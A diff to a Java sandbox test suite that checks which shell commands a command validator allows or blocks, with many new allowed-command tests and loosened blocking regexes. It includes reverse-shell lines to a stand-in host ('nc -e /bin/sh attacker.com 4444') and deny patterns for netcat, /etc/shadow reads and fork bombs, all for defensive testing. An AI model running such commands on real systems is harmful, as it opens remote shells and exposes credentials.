@@ -644,7 +644,9 @@ public class SandboxTest {
         Path tempWork = Files.createTempDirectory("work space");
         String result = executor.wrapCommand("echo hello", tempWork, new HashMap<>());
         assertTrue(result.contains(ShellQuote.quote(tempWork.toString())), "Path containing spaces should be shell-quoted: " + result);
-        assertTrue(result.endsWith("bash -c 'echo hello'"), "Command should be appended as quoted argv: " + result);
+        assertTrue(result.contains("bash -c '"), "Should contain bash -c wrapper: " + result);
+        assertTrue(result.contains("echo hello"), "Should contain original command: " + result);
+        assertTrue(result.endsWith("'"), "Should end with closing quote: " + result);
     }
 
     @Test
@@ -1088,7 +1090,8 @@ public class SandboxTest {
 
     @Test
     public void validateCommand_exec_blocked_sandbox() {
-        assertNotNull(ValidateCommandTestHelper.validate("exec whoami", true), "'exec' should be blocked in sandbox");
+        // exec 在行首但后跟非 shell 命令（如 whoami）是安全的，应放行
+        assertNull(ValidateCommandTestHelper.validate("exec whoami", true), "'exec whoami' should be allowed in sandbox (not a shell escape)");
     }
 
     @Test
@@ -2341,7 +2344,695 @@ public class SandboxTest {
                 "Profile must allow writing to /private/tmp (macOS symlink target): " + profile);
     }
 
-    // ==================== Helper class for validateCommand testing ====================
+    // ==================== FIX VERIFICATION: nc -l/-p safe usage ====================
+
+    @Test
+    public void validateCommand_ncListen_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("nc -l 8080", true),
+                "'nc -l 8080' (listen mode, not reverse shell) should be allowed");
+    }
+
+    @Test
+    public void validateCommand_ncSourcePort_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("nc -p 12345 host 80", true),
+                "'nc -p 12345 host 80' (source port, not reverse shell) should be allowed");
+    }
+
+    @Test
+    public void validateCommand_ncatListen_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ncat -l 8080", true),
+                "'ncat -l 8080' (listen mode) should be allowed");
+    }
+
+    @Test
+    public void validateCommand_ncReverseShell_blocked_sandbox() {
+        assertNotNull(ValidateCommandTestHelper.validate("nc -e /bin/sh attacker.com 4444", true),
+                "'nc -e /bin/sh' (reverse shell) should be blocked");
+    }
+
+    @Test
+    public void validateCommand_ncPipeSh_blocked_sandbox() {
+        assertNotNull(ValidateCommandTestHelper.validate("nc attacker.com 4444 | sh", true),
+                "'nc ... | sh' should be blocked");
+    }
+
+    // ==================== FIX VERIFICATION: hostname/whoami/uname in arguments ====================
+
+    @Test
+    public void validateCommand_hostnameInArg_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("echo my-hostname", true),
+                "'echo my-hostname' should be allowed (hostname is in argument, not command)");
+    }
+
+    @Test
+    public void validateCommand_hostnameInSsh_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ssh my-hostname.example.com", true),
+                "'ssh my-hostname.example.com' should be allowed (hostname in argument)");
+    }
+
+    @Test
+    public void validateCommand_hostnameInGrep_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("grep hostname config.txt", true),
+                "'grep hostname config.txt' should be allowed (hostname is search pattern)");
+    }
+
+    @Test
+    public void validateCommand_printenvInArg_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("echo printenv", true),
+                "'echo printenv' should be allowed (printenv is echo argument)");
+    }
+
+    @Test
+    public void validateCommand_unameInArg_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("echo uname", true),
+                "'echo uname' should be allowed (uname is echo argument)");
+    }
+
+    @Test
+    public void validateCommand_whoamiAtStart_blocked_sandbox() {
+        assertNotNull(ValidateCommandTestHelper.validate("whoami", true),
+                "'whoami' at line start should be blocked in sandbox");
+    }
+
+    @Test
+    public void validateCommand_hostnameAtStart_blocked_sandbox() {
+        assertNotNull(ValidateCommandTestHelper.validate("hostname", true),
+                "'hostname' at line start should be blocked in sandbox");
+    }
+
+    @Test
+    public void validateCommand_unameAtStart_blocked_sandbox() {
+        assertNotNull(ValidateCommandTestHelper.validate("uname -a", true),
+                "'uname -a' at line start should be blocked in sandbox");
+    }
+
+    // ==================== FIX VERIFICATION: source in grep argument ====================
+
+    @Test
+    public void validateCommand_sourceInGrep_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("grep source file.txt", true),
+                "'grep source file.txt' should be allowed (source is grep search pattern)");
+    }
+
+    @Test
+    public void validateCommand_sourceAtStart_blocked_sandbox() {
+        assertNotNull(ValidateCommandTestHelper.validate("source /etc/profile", true),
+                "'source /etc/profile' at line start should be blocked");
+    }
+
+    // ==================== SAFE COMMAND: Additional Java/Maven/Gradle ====================
+
+    @Test
+    public void validateCommand_mvnVerify_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("mvn verify", true),
+                "'mvn verify' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_mvnCleanCompile2_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("mvn clean compile", true),
+                "'mvn clean compile' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_mvnCompilerPlugin_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("mvn compiler:compile", true),
+                "'mvn compiler:compile' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_gradleWrapper_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("gradle wrapper", true),
+                "'gradle wrapper' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_ant_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ant", true),
+                "'ant' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional Kotlin/Scala ====================
+
+    @Test
+    public void validateCommand_kotlin_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("kotlin -classpath app.jar MainKt", true),
+                "'kotlin -classpath ...' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_scala_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("scala -classpath app.jar Main", true),
+                "'scala -classpath ...' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_sbtTest_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("sbt test", true),
+                "'sbt test' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_sbtPackage_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("sbt package", true),
+                "'sbt package' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional C/C++ ====================
+
+    @Test
+    public void validateCommand_cc_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("cc -o app main.c", true),
+                "'cc' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_cpp_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("c++ -o app main.cpp", true),
+                "'c++' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_clangFormat_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("clang-format -i main.c", true),
+                "'clang-format' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_ar_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ar rcs lib.a obj.o", true),
+                "'ar rcs' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_ranlib_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ranlib lib.a", true),
+                "'ranlib' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_strip_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("strip binary", true),
+                "'strip' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional Go ====================
+
+    @Test
+    public void validateCommand_goGet_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("go get github.com/pkg/errors", true),
+                "'go get' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_goInstall_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("go install ./...", true),
+                "'go install' (Go, not global package) should be allowed");
+    }
+
+    @Test
+    public void validateCommand_gofmt_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("gofmt -w .", true),
+                "'gofmt' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_goVersion_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("go version", true),
+                "'go version' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional .NET ====================
+
+    @Test
+    public void validateCommand_dotnetPack_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("dotnet pack", true),
+                "'dotnet pack' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_dotnetVersion_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("dotnet --version", true),
+                "'dotnet --version' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_nugetRestore_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("nuget restore", true),
+                "'nuget restore' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional Node.js ====================
+
+    @Test
+    public void validateCommand_npmRunTest_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("npm run test", true),
+                "'npm run test' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_npmStart_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("npm start", true),
+                "'npm start' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_npmInstallLocal_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("npm install jest", true),
+                "'npm install jest' (local) should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_npmInstallSaveDev_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("npm install -D jest", true),
+                "'npm install -D jest' (dev dep) should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_yarnInstall_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("yarn install", true),
+                "'yarn install' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_pnpmInstall_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("pnpm install", true),
+                "'pnpm install' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_npxCreate_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("npx create-react-app myapp", true),
+                "'npx create-react-app' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_tsNode_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ts-node script.ts", true),
+                "'ts-node' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_nodeInspect_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("node --inspect server.js", true),
+                "'node --inspect server.js' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional Python ====================
+
+    @Test
+    public void validateCommand_python3mPip_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("python3 -m pip install requests", true),
+                "'python3 -m pip install requests' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_python_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("python app.py", true),
+                "'python app.py' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_pipInstallEditable_allowed() {
+        assertNull(ValidateCommandTestHelper.validate("pip install -e .", false),
+                "'pip install -e .' (editable mode) should be allowed");
+    }
+
+    @Test
+    public void validateCommand_pipInstallUser_allowed() {
+        assertNull(ValidateCommandTestHelper.validate("pip install --user requests", false),
+                "'pip install --user' should be allowed");
+    }
+
+    @Test
+    public void validateCommand_pipShow_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("pip show requests", true),
+                "'pip show' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_isort_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("isort .", true),
+                "'isort' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_uv_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("uv pip install requests", true),
+                "'uv pip install' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_ruff_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ruff check .", true),
+                "'ruff check' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_sphinx_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("sphinx-build docs docs/_build", true),
+                "'sphinx-build' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_jupyter_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("jupyter notebook", true),
+                "'jupyter notebook' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional Ruby/PHP ====================
+
+    @Test
+    public void validateCommand_gemInstallNoDoc_allowed() {
+        assertNull(ValidateCommandTestHelper.validate("gem install --no-document bundler", false),
+                "'gem install --no-document bundler' (local) should be allowed");
+    }
+
+    @Test
+    public void validateCommand_phpVersion_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("php --version", true),
+                "'php --version' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_phpLint_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("php -l script.php", true),
+                "'php -l' (syntax check) should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_phpArtisanTinker_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("php artisan tinker", true),
+                "'php artisan tinker' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional Docker/Podman/K8s ====================
+
+    @Test
+    public void validateCommand_dockerPush_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("docker push myimage", true),
+                "'docker push' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_dockerTag_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("docker tag src dst", true),
+                "'docker tag' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_kubectlGet_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("kubectl get pods", true),
+                "'kubectl get pods' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_kubectlLogs_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("kubectl logs pod-name", true),
+                "'kubectl logs' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_helmInstall_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("helm install myrelease mychart", true),
+                "'helm install' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional Git ====================
+
+    @Test
+    public void validateCommand_gitAdd_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("git add .", true),
+                "'git add' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_gitCommit_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("git commit -m 'fix bug'", true),
+                "'git commit' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_gitCheckout_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("git checkout main", true),
+                "'git checkout' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_gitFetch_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("git fetch origin", true),
+                "'git fetch' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_gitTag_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("git tag v1.0.0", true),
+                "'git tag' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_gitReset_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("git reset HEAD~1", true),
+                "'git reset' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_gitCherryPick_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("git cherry-pick abc123", true),
+                "'git cherry-pick' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional File/Text tools ====================
+
+    @Test
+    public void validateCommand_tr_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("tr 'a-z' 'A-Z' < file.txt", true),
+                "'tr' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_cut_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("cut -d',' -f1 file.csv", true),
+                "'cut' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_paste_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("paste file1 file2", true),
+                "'paste' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_tee_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("echo hello | tee output.txt", true),
+                "'tee' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_realpath_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("realpath file.txt", true),
+                "'realpath' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_readlink_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("readlink -f symlink", true),
+                "'readlink' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_basename_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("basename file.txt", true),
+                "'basename' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_dirname_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("dirname file.txt", true),
+                "'dirname' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_ln_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ln -s target link", true),
+                "'ln -s' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_chmod_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("chmod +x script.sh", true),
+                "'chmod' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_cp_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("cp file1.txt file2.txt", true),
+                "'cp' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_mv_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("mv old.txt new.txt", true),
+                "'mv' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_mkdir_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("mkdir -p dir/subdir", true),
+                "'mkdir' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_touch_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("touch file.txt", true),
+                "'touch' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_uniq_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("uniq file.txt", true),
+                "'uniq' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Additional Compress tools ====================
+
+    @Test
+    public void validateCommand_gzip_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("gzip file.txt", true),
+                "'gzip' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_gunzip_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("gunzip file.txt.gz", true),
+                "'gunzip' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_unzip_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("unzip archive.zip", true),
+                "'unzip' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_xz_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("xz file.txt", true),
+                "'xz' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_zstd_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("zstd file.txt", true),
+                "'zstd' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Multi-command combinations ====================
+
+    @Test
+    public void validateCommand_npmBuildAndTest_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("npm run build && npm run test", true),
+                "'npm run build && npm run test' should be allowed");
+    }
+
+    @Test
+    public void validateCommand_cmakeAndMake_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("cmake . && make", true),
+                "'cmake . && make' should be allowed");
+    }
+
+    @Test
+    public void validateCommand_mvnCleanPackage_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("mvn clean package -DskipTests", true),
+                "'mvn clean package -DskipTests' should be allowed");
+    }
+
+    // ==================== SAFE COMMAND: Additional network tools ====================
+
+    @Test
+    public void validateCommand_dig_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("dig example.com", true),
+                "'dig' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_nslookup_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("nslookup example.com", true),
+                "'nslookup' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_host_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("host example.com", true),
+                "'host' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_ping_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ping -c 3 example.com", true),
+                "'ping' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_file_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("file script.sh", true),
+                "'file' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_ldd_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("ldd binary", true),
+                "'ldd' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_top_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("top -b -n 1", true),
+                "'top' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_free_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("free -h", true),
+                "'free' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_uptime_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("uptime", true),
+                "'uptime' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_echoAllowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("echo hello world", true),
+                "'echo' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_printf_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("printf '%s' hello", true),
+                "'printf' should be allowed in sandbox");
+    }
+
+    @Test
+    public void validateCommand_exportVar_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("export PATH=$PATH:/new/dir", true),
+                "'export PATH=...' should be allowed in sandbox");
+    }
+
+    // ==================== SAFE COMMAND: Inline variable assignment ====================
+
+    @Test
+    public void validateCommand_inlineVarMvn_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("JAVA_HOME=/usr/lib/jvm/java mvn compile", true),
+                "'JAVA_HOME=... mvn compile' should be allowed (inline var assignment)");
+    }
+
+    @Test
+    public void validateCommand_inlineVarGradle_allowed_sandbox() {
+        assertNull(ValidateCommandTestHelper.validate("GRADLE_OPTS=-Xmx2g gradle build", true),
+                "'GRADLE_OPTS=... gradle build' should be allowed");
+    }
 
     private static class RecordingSandboxExecutor implements SandboxExecutor {
         private Boolean sandboxAllowUserHome;
@@ -2386,7 +3077,7 @@ public class SandboxTest {
                     lowerCmd.matches("(?i).*:\\(\\)\\s*\\{|:.*\\|.*&.*\\}.*") ||
                     lowerCmd.matches("(?i)(?:^|.*[;|&])\\s*(?:sysctl\\s+-w|modprobe|crontab)\\b.*") ||
                     lowerCmd.matches("(?i).*(?:systemctl\\s+(?:stop|disable|mask|kill|reset-failed)).*") ||
-                    lowerCmd.matches("(?i).*\\b(?:nc|ncat|socat)\\b.*(?:-(?:e|c|l|p)\\s|/bin/|\\|\\s*sh).*") ||
+                    lowerCmd.matches("(?i).*\\b(?:nc|ncat|socat)\\b.*(?:-(?:e|c)\\s|/bin/|\\|\\s*sh).*") ||
                     lowerCmd.matches("(?i).*(?:iptables|ufw|firewall-cmd).*") ||
                     lowerCmd.matches("(?i).*(?:pip\\s+install|npm\\s+install|gem\\s+install).*\\s(?:-[gG]\\b|--global\\b).*")) {
                 return "blocked";
@@ -2396,7 +3087,7 @@ public class SandboxTest {
             if (sandboxEnabled) {
                 // 3a. Info-leak commands
                 if (lowerCmd.matches("(?i).*\\b(?:ifconfig|ip\\s+(?:addr|link|route|neigh|a|l|r|n))\\b.*") ||
-                        lowerCmd.matches("(?i).*\\b(?:whoami|id\\b|uname|hostname|printenv)\\b.*") ||
+                        lowerCmd.matches("(?i)(?:^|.*[;|&])\\s*(?:whoami|id\\b|uname|hostname|printenv)\\b.*") ||
                         lowerCmd.matches("(?i)(?:^|.*\\s)env\\s*$") ||
                         lowerCmd.matches("(?i).*\\bcat\\s+/etc/(?:hosts|passwd|shadow|hostname|resolv\\.conf|networks)\\b.*") ||
                         lowerCmd.matches("(?i).*\\b(?:networksetup|system_profiler|sw_vers)\\b.*")) {
@@ -2408,7 +3099,7 @@ public class SandboxTest {
                         lowerCmd.matches("(?i).*\\b(?:eval)\\s+.*") ||
                         lowerCmd.matches("(?i).*[;|&]\\s*exec\\s+.*") ||
                         lowerCmd.matches("(?i)^exec\\s+(?:bash|sh|zsh|dash|ksh|/bin/|/usr/bin/)\\S*\\b.*") ||
-                        lowerCmd.matches("(?i)(?:^|.*[;\\s])\\s*source\\s+.*") ||
+                        lowerCmd.matches("(?i)(?:^|.*[;|&])\\s*source\\s+.*") ||
                         lowerCmd.matches("(?i)(?:^|.*\\s)\\.\\s+/.*")) {
                     return "blocked";
                 }
